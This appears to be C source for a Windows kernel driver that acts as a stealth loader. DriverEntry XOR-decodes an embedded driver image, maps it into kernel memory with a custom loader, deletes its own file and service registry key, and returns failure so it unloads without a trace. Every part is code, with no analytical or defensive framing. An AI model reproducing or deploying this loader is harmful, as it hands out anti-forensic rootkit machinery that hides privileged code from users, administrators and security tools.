#pragma once
#include <ntifs.h>
#include "Loader.h"
#include "PeData.h"
#include "tools.h"

typedef struct _KLDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	PVOID ExceptionTable;
	ULONG ExceptionTableSize;
	// ULONG padding on IA64
	PVOID GpValue;
	PVOID NonPagedDebugInfo;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT __Unused5;
	PVOID SectionPointer;
	ULONG CheckSum;
	// ULONG padding on IA64
	PVOID LoadedImports;
	PVOID PatchInformation;
} KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;

VOID DriverUnload(PDRIVER_OBJECT pDriver)
{

}
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)
{
	ULONG dwImageSize = sizeof(sysData);
	unsigned char * pMemory = (unsigned char *)ExAllocatePool(NonPagedPool,dwImageSize);
	memcpy(pMemory, sysData, dwImageSize);
	for (ULONG i = 0; i < dwImageSize; i++)
	{
		pMemory[i] ^= 0xd8;
		pMemory[i] ^= 0xcd;
	}
	
	
	LoadDriver(pMemory);

	ExFreePool(pMemory);
	
	PKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)pDriver->DriverSection;
	if (ldr)
	{
		SelfDeleteFile(ldr->FullDllName.Buffer);
	}


	DeleteRegisterPath(pReg);


	//pDriver->DriverUnload = DriverUnload;
	return STATUS_UNSUCCESSFUL;
}